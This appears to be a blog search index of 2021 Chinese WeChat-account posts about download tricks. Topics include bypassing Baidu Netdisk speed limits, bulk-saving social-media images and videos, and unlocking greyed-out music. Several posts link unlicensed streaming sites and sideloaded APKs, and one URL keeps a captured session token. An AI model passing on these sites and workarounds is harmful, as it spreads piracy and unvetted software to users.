<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2021年4月如何加速下载百度网盘文件，分享个不限速的内部体验版]]></title>
    <url>%2F2021%2F04%2F16%2F2021%E5%B9%B44%E6%9C%88%E5%A6%82%E4%BD%95%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%96%87%E4%BB%B6%EF%BC%8C%E5%88%86%E4%BA%AB%E4%B8%AA%E4%B8%8D%E9%99%90%E9%80%9F%E7%9A%84%E5%86%85%E9%83%A8%E4%BD%93%E9%AA%8C%E7%89%88%2F</url>
    <content type="text"><![CDATA[苏生不惑第240 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于百度网盘之前分享过很多文章了： 2020 年 3 月最新加速下载百度网盘文件方法 2020 最全百度网盘搜索，找电影资源不再愁 2020年10月最新免费加速下载百度网盘文件方法 百度网盘分享链接秒挂？试试这个神器 在线加速播放百度网盘视频（其实支持任意网站） 不过加速下载方法目前都挂了，网盘助手那个油猴脚本还能用，但也限速了https://greasyfork.org/scripts/378301 。 可以试试这个百度网盘下载工具 https://kinhdown.kinh.cc/，它有网页版和客户端，网页版https://pan.kdbaidu.com/ 直接输入网盘地址和提取码解析文件。 顺便分享个百度网盘的油猴脚本 百度云精简 https://greasyfork.org/zh-CN/scripts/422814 ，它可以删除“复制这段内容后打开百度网盘手机App，操作更方便哦，来自百度会员超级无敌永久svip”，精简部主页广告、邀请，视频添加倍速按钮，以及自定义提取码功能。 今天主要分享个百度网盘的安卓内部体验版，经过测试不限速，为什么确认是百度出的，因为下载地址是百度链接https://downapp.baidu.com/Baidunetdisk/AndroidPhone/11.8.66.0/1/1022917m/20210323171913/Baidunetdisk_AndroidPhone_11-8-66-0_1022917m.apk ，版本是11.8.66，只有35MB大小， 安装后会覆盖现有的百度网盘版本。 https://haosu.lanzous.com/idHbTmvr1vc 但是不知道为什么在百度网盘的更新日志里没找到这个版本 https://yun.baidu.com/disk/version这个内部体验版打开后只有 文件，传输，我的 三个板块，只保留了下载、上传、视频播放等基础功能，测试下载速度在1MB/s左右，还是比阿里云盘慢不少，期待阿里云盘的分享功能上线。 注意启动的时候会提示你更新版本，千万别更新，否则又是原来的百度了。 最后分享个阿里云盘的客户端内测版（在公众号后台回复 阿里云获取地址），还没正式上线。 之前分享过阿里云盘公测了，可增加容量的福利码来了（长期更新） ，这里再分享几个200G的福利码：面朝大海，春暖花开，鸟语花香，春意盎然。 主要功能和APP上差不多。在线播放视频很流畅。下载速度有6-7MB/s，当然我觉得网页版 https://aliyundrive.com/ 也挺好用的。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[比特币突破6万美元了，原来我还有点比特币]]></title>
    <url>%2F2021%2F04%2F16%2F%E6%AF%94%E7%89%B9%E5%B8%81%E7%AA%81%E7%A0%B46%E4%B8%87%E7%BE%8E%E5%85%83%E4%BA%86%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%88%91%E8%BF%98%E6%9C%89%E7%82%B9%E6%AF%94%E7%89%B9%E5%B8%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第239 篇原创文章，将本公众号设为星标，第一时间看最新文章。 为什么突然说起比特币，昨天（4月13日）btc创历史新高6万2美元了，还上了次微博热搜，其实已经上过n次了。看比特币的历史价格曲线，一年前还是3000多刀，这就翻了十几倍。10年前才10块钱，这条微博可以用做考古了 https://weibo.com/2155152114/eBpa3151sIm?type=comment 比特币真是个让人又爱又恨的东西，从2013年开始，多数人谈起他，就是太贵了，但戏剧的是，这些年，它变得更贵了，而且发展得更好。 是啊，太贵了，目前41万人民币一个，前段时间看到篇文章：找回了2个btc，人生处处是惊喜啊。 其实我在2018年就投入了十几万，不过当时买的不是btc，因为觉得太贵了，后来进入了3年左右的熊市，各种垃圾币亏得很惨，就剩下0.1个btc了，这次比特币不断上涨我又打开了钱包。还发了条朋友圈：4月破6万就给每个评论朋友圈的人发红包6块6。说到做到，中午发了一个小时左右，发了100多个红包。 你以为我今天说这些是为了让你现在去买比特币，那你错了，也许今年能到20万美元，未来能到100万美元（谁能预料到呢），但有句话话是这么说的：你永远赚不到你认知以外的钱，即使侥幸赚了，也会以某种方式亏回去，曾经的我就是教训。 说实话，我也没看懂这玩意，那0.1个就这么放着吧（目前价值7万左右），也算是参与了回数字货币。 最后，不要轻易买比特币。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[能安装Chrome扩展和油猴脚本的手机浏览器]]></title>
    <url>%2F2021%2F04%2F16%2F%E8%83%BD%E5%AE%89%E8%A3%85Chrome%E6%89%A9%E5%B1%95%E5%92%8C%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%E7%9A%84%E6%89%8B%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%99%A8%2F</url>
    <content type="text"><![CDATA[苏生不惑第238 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过很多Chrome扩展的文章，不过都是电脑端的，今天分享几个手机上能安装扩展和油猴脚本的浏览器。 上不了谷歌如何安装 Chrome 扩展？ 那些有趣/实用的 Chrome 扩展神器 那些有趣/实用的 Chrome 扩展神器系列（二） 那些有趣/实用的 Chrome 扩展神器系列（三） 微软 edge 浏览器如何安装扩展 实用油猴脚本推荐，让你的谷歌浏览器更强大 Kiwi这是第一个要推荐的浏览器，Kiwi基于Chromium和WebKit内核开发（类似Yandex浏览器），安装扩展方式与电脑端一样，直接访问Chrome扩展商店，搜索你想安装的扩展就可以了，堪称手机版Chrome https://kiwibrowser.com/ ，如果下载不了在公众号后台回复 浏览器 获取下载地址 https://github.com/kiwibrowser/android除了在线安装，同样可以导入下载好的crx文件安装，在菜单—-扩展程序或者地址栏输入 kiwi://extensions 进入扩展管理。 这样就可以上谷歌商店安装扩展了。 火狐浏览器pc上的火狐浏览器应该很多人在用，现在手机浏览器也可以安装插件了 https://www.mozilla.org/en-US/firefox/mobile/ ，不过推荐使用国际版，在GitHub上下载即可 https://github.com/mozilla-mobile/fenix Iceraven浏览器这是基于火狐内核开发的浏览器 https://github.com/fork-maintainers/iceraven-browser ，如果下载不了在公众号后台回复 浏览器 获取下载地址，同样支持安装扩展程序和油猴脚本，也支持火狐账号登录 。附加组件里直接安装油猴扩展。打开https://greasyfork.org/zh-CN/scripts/406336 直接安装脚本。 Gear 浏览器这是个ios上支持油猴脚本的浏览器，由于我不用ios，大家自己安装体验https://apps.apple.com/cn/app/gear-browser/id1458962238 雨见浏览器这款浏览器支持多核切换，内置很多实用功能，可安装油猴脚本，去除各种广告等 https://www.yjllq.com/ 。 精选里有游戏，小说，漫画，搜书，工具箱等，都分类整理好了。 via浏览器大小不超过 1M，界面干净 https://viayoo.com/zh-cn/ ，还有强大的via轻插件 ，比如常见的广告拦截、网页复制限制解除、网页翻译等http://via-app.cn/ 最后分享个代理可以上谷歌的APP，在公众号后台回复 谷歌 获取下载地址 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键下载QQ空间相册，微博相册，知乎回答图片，豆瓣图片，instagram图片]]></title>
    <url>%2F2021%2F04%2F16%2F%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BDQQ%E7%A9%BA%E9%97%B4%E7%9B%B8%E5%86%8C%EF%BC%8C%E5%BE%AE%E5%8D%9A%E7%9B%B8%E5%86%8C%EF%BC%8C%E7%9F%A5%E4%B9%8E%E5%9B%9E%E7%AD%94%E5%9B%BE%E7%89%87%EF%BC%8C%E8%B1%86%E7%93%A3%E5%9B%BE%E7%89%87%EF%BC%8Cinstagram%E5%9B%BE%E7%89%87%2F</url>
    <content type="text"><![CDATA[苏生不惑第237 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于下载图片之前分享过几篇文章： 如何批量下载知乎回答图片 如何用 Chrome 扩展备份你的 QQ 空间相册 之前分享过如何批量下载知乎回答图片，这里再做个整理，一键下载QQ空间相册，微博相册，知乎回答图片，豆瓣图片，instagram图片。 QQ空间相册话说2019年QQ空间推出的那个视频《时光密码》还是挺感动人的 https://user.qzone.qq.com/20050606/blog/1559786793 ，内容取材于一对QQ网友 “往事随风”和“轻舞飞扬” 的爱与缘。 https://www.bilibili.com/video/av54233111/ 你好，我是往事随风，你好，我叫轻舞飞扬。 有兴趣点击下面的视频号观看，如果想下载视频号里的视频参考之前文章2021年4月如何下载微信视频号的视频？简直不要太简单 。 这里用Python脚本下载QQ空间照片 https://github.com/dslwind/qzone-photo-downloader ，先pip install selenium 安装库，然后下载chromedriverhttps://sites.google.com/a/chromium.org/chromedriver/downloads ，如果打不开谷歌下载国内镜像一样的https://npm.taobao.org/mirrors/chromedriver ，下载解压后将chromedriver.exe放在脚本目录或者加入系统环境变量。 注意下载 chromedriver 前先打开chrome://settings/hel p看看自己Chrome浏览器版本，要下载版本一样的文件。 我把Python代码打包好了，不用安装Python直接双击运行软件即可（在公众号后台回复QQ获取软件），输入自己QQ号和要导出的QQ号。 它会打开你的默认浏览器，点击登录QQ。 很快脚本下载完了。 如果你还想导出QQ空间其他资料可以安装Chrome扩展 QQ空间导出助手https://chrome.google.com/webstore/detail/qq%E7%A9%BA%E9%97%B4%E5%AF%BC%E5%87%BA%E5%8A%A9%E6%89%8B/aofadimegphfgllgjblddapiaojbglhf?hl=zh-CN， 扩展最近更新时间2021年1月27日， 关于如何安装和使用Chrome扩展见之前文章 上不了谷歌如何安装 Chrome 扩展？ ，它可以导出备份QQ空间的日志、私密日志、说说、相册、留言板、QQ好友、视频、收藏夹为文件，便于永久保存与迁移。使用很简单，就不多介绍了。 知乎所有回答图片关于下载知乎回答图片之前写过 如何批量下载知乎回答图片，不过只能下载单个回答，如果想下载所有回答图片可以使用这个工具（在公众号后台回复 知乎 获取软件）。 打开软件后输入问题id回车运行即可，比如 关于刘亦菲的这个问题https://www.zhihu.com/question/374798860 ，id为374798860回答里共2751张美图。200多个回答的图片都下载下来了，下载文件在以问题id为名的目录里。 神仙姐姐的颜值简直惊为天人，在知乎找壁纸不愁了。 微博相册先安装Chrome扩展 https://chrome.google.com/webstore/detail/octo%E5%BE%AE%E5%8D%9A%E7%9B%B8%E5%86%8C%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD/cdimdlckbkfelaogjhfbkjcfncbpngkn?hl=zh-CN ，扩展最近更新时间2021年2月6日。 安装成功后进入微博主页，这里选择王菲的微博 https://www.weibo.com/u/1629810574 ，天后已经6年不更新微博了， 点击扩展图标，选择需要下载的相册 。 这个相册有6张图片，很快就下载好了。 如果还想下载微博内容可以安装 Octoman 微博备份工具 https://github.com/misswell/octoman-weibo-backup，https://chrome.google.com/webstore/detail/octoman%E5%BE%AE%E5%8D%9A%E5%A4%87%E4%BB%BD/pojodomdlpobompicdllljgiomnfpmho ，扩展最近更新时间2021年2月7日，这个在之前文章再谈备份微博已经分享过 。 安装扩展后点击Chrome扩展图标，在下拉列表中选择需要下载的用户，然后点击保存即可。 这个扩展将每500条微博（会展开长微博）存为一个HTML文件， 也可以在选项设置调整，不过这个扩展有个不方便的地方没有时间段选择，每次都得重新备份。 如果还想下载和分析微博账号数据可以看看我之前的文章 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 ，我分析过李健的微博词云图，他的微博关键词为音乐，北京，朋友，歌手，电影，居然还提到了周杰伦。 每个月转发评论点赞总数图，可以看到2016-2018年的微博数据是高峰期。原创微博和转发微博数据比例。 发微博的工具主要为pc网页和iPad。 instagram图片 前几天分享过上ins的APP 上 Instagram 看看周杰伦又更新了什么动态，这里再分享个下载ins图片的Chrome扩展 https://chrome.google.com/webstore/detail/download-instagram-videos/bjpgfccobjfpicoddafljhplofcmgfjh/related?hl=zh-CN ,扩展最近更新时间2020年9月28日，它支持从Instagram下载视频，卷轴视频，照片，故事和IGTV视频，打开ins详情页点击底部的下载按钮。然后跳转到下载页。https://fbion.com/zh-CN/instagram-downloader.html#https://www.instagram.com/p/CM162urH4s5/ 豆瓣相册这个Chrome扩展用于备份豆瓣的用户数据及图片，并支持将备份数据导出到 Excel，扩展地址 https://chrome.google.com/webstore/detail/%E8%B1%86%E4%BC%B4%EF%BC%9A%E8%B1%86%E7%93%A3%E8%B4%A6%E5%8F%B7%E5%A4%87%E4%BB%BD%E5%B7%A5%E5%85%B7/ghppfgfeoafdcaebjoglabppkfmbcjdd ，扩展最近更新时间2021年1月14日，功能有这些：12345• 备份本人或他人的豆瓣账号数据• 脱机浏览备份数据• 将备份数据导出为 Excel 文件• 将备份数据中的图片上传到 Cloudinary 云存储• 迁移备份数据到当前豆瓣帐号 登录账号后点击新建任务，选择备份的项目，这里选相册。还可以导出数据。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021年4月如何下载微信视频号的视频？简直不要太简单]]></title>
    <url>%2F2021%2F04%2F16%2F2021%E5%B9%B44%E6%9C%88%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BD%E5%BE%AE%E4%BF%A1%E8%A7%86%E9%A2%91%E5%8F%B7%E7%9A%84%E8%A7%86%E9%A2%91%EF%BC%9F%E7%AE%80%E7%9B%B4%E4%B8%8D%E8%A6%81%E5%A4%AA%E7%AE%80%E5%8D%95%2F</url>
    <content type="text"><![CDATA[苏生不惑第236 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于下载视频之前分享过很多文章了： 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 一键下载中国大学/网易云课堂/慕课网等课程视频和课件 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 今天分享下如何下载微信的视频号，以下面这个视频为例。 顺便这里做个调查，你平常会刷视频号吗？ 播放完缓存下载在微信里完整播放完这个视频，然后安卓手机进入文件管理目录 /sdcard/Android/data/com.tencent.mm/cache/d6269468703f9cd26cb93626ebc/finder/video，中间的d6269468703f9cd26cb93626ebc每个手机可能名字不一样，这是视频号看过视频的缓存目录，找到你要下载的视频，修改文件名后缀为.mp4，然后把文件移动到相册就行了。虽然有点麻烦，但就这么个功能还有人做APP来卖（我是为了测试才去下载的）。 如果你用的ios可以参考下面这个方法，非常简单。 电脑端下载先把电脑版微信更新到最新版3.2.1.112，这样就可以在电脑上看视频号了，将视频转发到微信群或者好友，打开后右键查看源代码。然后会自动打开一个TXT文件，另存为HTML文件。再用谷歌浏览器打开这个HTML文件，可以看到视频可以播放了，右键下载即可。 下载的是mp4文件。 我也觉得马冬梅比秋雅好看，你呢？ 除了这种方法还可以用Charles抓包获取播放地址 https://channels.weixin.qq.com/web/pages/feed?oid=u80l9MSOCDw&amp;nid=57CwmXIcM4s&amp;sessionid=102_1617707171&amp;contextid=feed_1617707562&amp;exportkey=n_ChQIAhIQJR5fxJHfUi%2Fe2jqZJS6WQBLsAQIE97dBBAEAAAAAANgAChKUB3wAAAAOpnltbLcz9gKNyK89dVj0vXoPpJwNzn58oo6PMygIt4Bks9wUhOfplfMDnMd0dFPxX1B6DV6kNY4jtEgcabuXo%2FEZWylY5sEDq8urBH%2Bguc2yz6n03uyA9%2B4%2F%2BhHukDQiZzhQaMtSKc%2FfZeI%2BuVjKEqcZzcbQIoxdXD7ON1Xp0NJs%2Fs9PJnZTC4qQkddGHE%2FL02d%2Bikl2BET%2FW5xg8Bsllul0ql0qNMfpkpaBDlAyKiBNpfPOYBMTGO6Y%2BmTUuZKFBTIB2wUOLpOMoB0zMrh8qH0tWjPO&amp;pass_ticket=bfBUf91YdydHWPVYK7QSTP8awPYSjE9Bf7LK7aTHChnYva3z8Wf0sKRH7pYMKVwD&amp;wx_header=0 ，这个跟之前抓包获取公众号接口下载公众号文章类似 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 ，如果你有需要下载的公众号微信联系我。 用浏览器打开也能播放下载。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[清明小长假不无聊：分享一大波影视网站和APP，轻松看全网视频]]></title>
    <url>%2F2021%2F04%2F16%2F%E6%B8%85%E6%98%8E%E5%B0%8F%E9%95%BF%E5%81%87%E4%B8%8D%E6%97%A0%E8%81%8A%EF%BC%9A%E5%88%86%E4%BA%AB%E4%B8%80%E5%A4%A7%E6%B3%A2%E5%BD%B1%E8%A7%86%E7%BD%91%E7%AB%99%E5%92%8CAPP%EF%BC%8C%E8%BD%BB%E6%9D%BE%E7%9C%8B%E5%85%A8%E7%BD%91%E8%A7%86%E9%A2%91%2F</url>
    <content type="text"><![CDATA[苏生不惑第235篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于影视剧之前写过好几篇文章： 如何更优雅地看电影/刷剧 如何根据台词找到对应电影片段 Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 2020 最全百度网盘搜索，找电影资源不再愁 如何通过电影截图找到电影 2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧 一个可以直接刷 YouTube 视频的神器 APP 没有b站大会员怎么看番剧 清明节小长假你去哪玩了呢？如果在家无聊可以看看今天分享的几个好用的影视剧网站和APP。 真不卡为数不多的超清无水印视频站，比如最近大热的《哥斯拉大战金刚》 https://www.zhenbuka.com/vodplay/80906-1-1/ ，观看非常流畅，不过右下角有小广告，可以安装Chrome扩展去除，见之前文章如何去除烦人的垃圾广告还有个专题收集了豆瓣排行榜TOP250的电影。 南瓜电影网站http://www.nangua5.com/如果有卡段可以切换播放源。 片库这个网站除了提供在线观看还有下载链接 https://www.pianku.li/ 电影狗这是个电影聚合站 https://www.dianyinggou.com/yingku/ 91美剧如果你爱看美剧别错过这个网站 https://91mjw.com/类似的还有人人影视 http://www.yyetss.com/ ，韩剧https://www.hmtv.me/以及美剧星球https://www.meijuxq.com/ 不看VIP免费看VIP影视剧 https://bukaivip.com/ 哈哩哈哩这个动漫迷别错过http://halihali2.com 奈飞星这个网站可以免翻看网飞 https://nfxhd.com/ ，还有对应的APP 。 syrmehttps://tv.syrme.top/ 这个也有对应APP。 其他更多影视网站见导航站影视森林 http://www.549.tv/，收集了上百个优质影视资源站。更多影视APP 在公众号后台回复 电影获取下载地址 https://lanzous.com/b0f19dneb ，https://www.lanzous.com/b0f1944aj 网站和APP这么多，是不不知道看什么，之前分享过b站上能看top250的电影过年无聊？来b站看豆瓣电影 Top 250，这些经典电影可能看过很多遍了，这里再分享个豆瓣豆列国内视频网站可看的无删减优质资源集合https://www.douban.com/doulist/135608682/?sort=seq&amp;playable=0， 目前已收录700多部电影，如果需要VIP再去上面分享的网站和APP搜索。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（十二）]]></title>
    <url>%2F2021%2F04%2F02%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第234篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过有趣的网站有： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 那些有趣的网站系列（六） 那些有趣的网站系列（七） 那些有趣的网站系列（八） 那些有趣的网站系列（九） 那些有趣的网站系列（十） 那些有趣的网站系列（十一） 这是系列第12篇。 Flash 保存计划这个网站从https://archive.org/web/ 抓取了很多经典flash，使用https://ruffle.rs/ 让 Flash 可以在现代浏览器中运行，满满的回忆 https://flash.zczc.cz/很多年前那首很火的《大学生自习室》也是通过flash在网络流传的。 网站还提供下载。 考拉这个网站有意思，鼠标移动圆会不断分裂增加，有点类似刮刮乐http://koalastothemax.com最后显示是只考拉，也可以自定义背景图片http://koalastothemax.com/?Base64(图片url) 可视化电脑快捷键映射图一图学会电脑的快捷键使用 https://haujetzhao.github.io/ShortcutMapper_Chinese/https://haujet.gitee.io/shortcutmapper_chinese/ 大盘云图一图看整个大盘，炒股的小伙伴可以看看https://dapanyuntu.com/。 聚点资讯https://www.judian.com.cn/top 输入关键词可以查找这个关键词的全网热点资讯。 一键生成各种姿势的火柴人 gif这是个开源项目https://github.com/kenkawakenkenke/stickfigure-recorder，只需用摄像头录制真人视频就能一键生成火柴人gif图 https://stickfigure-recorder.web.app/ RSS 订阅微博博主优雅地使用 RSS 阅读器订阅微博博主 https://rssfeed.today/weibo/ 。 比如李健的微博rss地址https://rssfeed.today/weibo/rss/1744395855 查找数字在π的位置前几天微博上有个热搜#你生日在圆周率第几位# 输入你的生日即可查找所在位置 https://piday2021.yux.io/ 多图合成 GIF将多张张国荣的图片合成为GIF图 https://tt0.top/效果如下，纪念永远的哥哥。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021年如何上 Instagram 看看周杰伦又更新了什么动态]]></title>
    <url>%2F2021%2F04%2F02%2F2021%E5%B9%B4%E5%A6%82%E4%BD%95%E4%B8%8A-Instagram-%E7%9C%8B%E7%9C%8B%E5%91%A8%E6%9D%B0%E4%BC%A6%E5%8F%88%E6%9B%B4%E6%96%B0%E4%BA%86%E4%BB%80%E4%B9%88%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[苏生不惑第233 篇原创文章，将本公众号设为星标，第一时间看最新文章。 为什么突然写Instagram呢，前几天周杰伦的一条ins：哥刮胡子了请问大家满意吗 上了微博热搜，有了刘德华开抖音了，一键下载华仔所有无水印视频 ，于是也想看看杰伦的ins。 关于ins就不多介绍了，以下来自百科，这里分享2个看周杰伦ins的方式。 Instagram（照片墙）是一款运行在移动端上的社交应用，以一种快速、美妙和有趣的方式将你随时抓拍下的图片彼此分享。 微信小程序小程序 FOLL https://foll.net/ 把ins上的部分内容搬运过来了，应该是通过ins的api获取的数据，现在电脑上也可以搜索小程序了，很方便。首页有很多明星的ins推荐，原来很多国内明星和网红都有ins账号。这里搜索周杰伦进入他的主页。就是微博热搜上这条ins动态了，果然没有胡子很帅气，可惜看不了评论。 APP如果不习惯用小程序可以使用这款APP （支持安卓和ios，在公众号后台回复ins 获取下载地址） ，它的注册不验证手机号，所以随便填信息，更良心的是这个APP没有广告。 其实FOLL也有APP版，不过广告太多了，简直没法用。 和林俊杰在一起。和老婆昆凌，黄金搭档方文山在一起。 最近原创文章： 高颜值的网易云音乐第三方客户端，还支持听变灰歌曲 一键去除腾讯/优酷/爱奇艺/b站视频水印 5分钟搞定b站答题成为正式会员，每天自动刷经验值升级账号 2021 微信运动一键刷步数，让你成功占领封面 好玩，这个 APP 用AI 让老照片动起来了 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 一个可以直接刷 YouTube 视频的神器 APP 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高颜值的网易云音乐第三方客户端，还支持听变灰歌曲]]></title>
    <url>%2F2021%2F04%2F02%2F%E9%AB%98%E9%A2%9C%E5%80%BC%E7%9A%84%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E7%AC%AC%E4%B8%89%E6%96%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%8C%E8%BF%98%E6%94%AF%E6%8C%81%E5%90%AC%E5%8F%98%E7%81%B0%E6%AD%8C%E6%9B%B2%2F</url>
    <content type="text"><![CDATA[苏生不惑第232 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于网易云音乐之前写过很多文章了： 那些你可能不知道的网易云音乐奇技淫巧 不想下载那么多音乐软件？全网音乐在线听和下载 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 网易云音乐等级快速升级：每天自动打卡听歌300首 一键解锁网易云音乐变灰歌曲 歌单助手：一键导出网易云音乐歌单列表，推荐你喜爱的专辑 虾米音乐关闭后还有什么好用的音乐软件？ 文章开始前说下，每天自动打卡人数太多了，我的腾讯云扛不住了，大家使用网站来打卡吧（在公众号后台回复 音乐 获取网站）。 今天再分享个高颜值的网易云音乐第三方客户端YesPlayMusic，支持 Windows，macOS， Linux系统，它还是开源的https://github.com/qier222/YesPlayMusic ，还有网页版 https://music.qier222.com ，界面非常简洁，默认推荐了 Apple Music 、 歌单、歌手、新专辑和排行榜 播放歌曲后可以直接用idm下载到本地。 另外还支持自己部署，我用GitHub免费搭建了个自己的在线版YesPlayMusic https://susheng-music-free.vercel.app 。 支持网易云账号登录（这样海外用户也能正常使用网易云音乐了），客户端支持 UnblockNeteaseMusic https://github.com/nondanee/UnblockNeteaseMusic ，这样就可以借助QQ/酷狗/酷我的播放源替换无版权变灰歌曲了 。 这个和之前分享的一键解锁网易云音乐变灰歌曲 一样。 实现了在网易云音乐听周杰伦歌曲。 当然除了YesPlayMusic ，之前分享过的遗憾迟香音乐助手（在公众号后台回复 音乐 获取软件）也可以听周杰伦。 还有开源的洛雪音乐助手（支持Windows和Mac系统 ） https://github.com/lyswhut/lx-music-desktop 。 下载的音频是mp3格式文件。就不用借助https://ix64.github.io/unlock-music/ 这样的工具来转换ncm，qmc, mflac, mgg等格式。 最后分享个Python脚本 https://github.com/xiyaowong/spiders，支持下载抖音无水印视频、皮皮虾、快手、网易云音乐、qq音乐、酷我音乐、咪咕音乐、荔枝FM音频、知乎视频、最右语音、微博等，比如这首酷我音乐歌曲http://www.kuwo.cn/album_detail/1293 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个可以直接刷 YouTube 视频的神器 APP]]></title>
    <url>%2F2021%2F04%2F02%2F%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%B7-YouTube-%E8%A7%86%E9%A2%91%E7%9A%84%E7%A5%9E%E5%99%A8-APP%2F</url>
    <content type="text"><![CDATA[苏生不惑第230篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于看电影之前分享过好几篇文章： 如何根据台词找到对应电影片段 2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧 2020 最全百度网盘搜索，找电影资源不再愁 如何通过电影截图找到电影 如何更优雅地看电影/刷剧 今天分享个神奇的 APP 油果 https://www.youguotv.com/ ，可以直接在线看 YouTube 的视频， ios在 App Store下载，安卓在应用宝搜索 油果 https://a.app.qq.com/o/simple.jsp?pkgname=com.yixia.youguo 查了下这个网站的备案 https://beian.miit.gov.cn/#/Integrated/recordQuery ，居然是个国内公司开发的。天眼查上查了下有个熟悉的小咖秀https://www.tianyancha.com/company/3153887614 油果 APP上有很多分类，可以选择自己感兴趣的，当然过滤了不少视频，是个精简版的油管。先看看李子柒的油管主页 https://www.youtube.com/channel/UCoC47do520os_4DBMEFGg4A ，目前有1470万粉丝了，不过已经一个月没更新了。 在APP上的视频也是同步YouTube更新的，而且和b站一样看视频无广告，还可以免费缓存下载。也可以使用分享后的链接地址https://v.youguotv.com/?scid=6765303878533345280&amp;cvId=&amp;uid=548046606648342573&amp;cuId=&amp;syncStatus=0&amp;shareuid=&amp;mediaType=1 ，然后用idm下载视频到电脑。国外视频可以使用油果翻译直接显示中文字幕。 应用商店都在打一星保护，大家低调使用。 最后分享个在线视频播放器 H-Player ，开源地址https://github.com/ZyqGitHub1/h-player-v2 ，它可以实现hls视频流的在线播放。 下载软件后选择视频源文件导入 https://gist.github.com/ZyqGitHub1/104becf19ebb84f601e3d32b59418944，目前视频源文件仅支持 json格式。导入成功后搜索《寄生虫》就可以播放了。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[刘德华开抖音了，一键下载华仔所有无水印视频]]></title>
    <url>%2F2021%2F04%2F02%2F%E5%88%98%E5%BE%B7%E5%8D%8E%E5%BC%80%E6%8A%96%E9%9F%B3%E4%BA%86%EF%BC%8C%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E5%8D%8E%E4%BB%94%E6%89%80%E6%9C%89%E6%97%A0%E6%B0%B4%E5%8D%B0%E8%A7%86%E9%A2%91%2F</url>
